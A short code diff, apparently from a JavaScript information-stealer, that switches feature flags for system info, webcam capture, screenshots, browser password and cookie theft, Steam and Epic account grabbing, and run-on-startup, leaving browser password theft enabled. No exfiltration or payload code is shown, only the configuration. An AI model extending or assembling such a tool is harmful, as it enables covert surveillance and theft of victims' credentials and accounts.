@@ -2,15 +2,15 @@
 // try to keep these in order
   // system info
 let runOnStartupToggle = false; //TODO (might move to a preloader)
-let sysInfoToggle = true; //FUNCTIONAL
-let webcamToggle = true; //FUNCTIONAL
-let screenshotToggle = true; //FUNCTIONAL
+let sysInfoToggle = false; //FUNCTIONAL
+let webcamToggle = false; //FUNCTIONAL
+let screenshotToggle = false; //FUNCTIONAL
   // browser info
 let browserPassToggle = true; //FUNCTIONAL
 let browserCookieToggle = false; //TODO
   // game info
-let steamToggle = false; //VERIFY
-let epicToggle = false; //VERIFY
+let steamToggle = false; //FIXING
+let epicToggle = false; //FIXING
 
 // mutex generation for directory creation
 const fs = require('fs').promises;
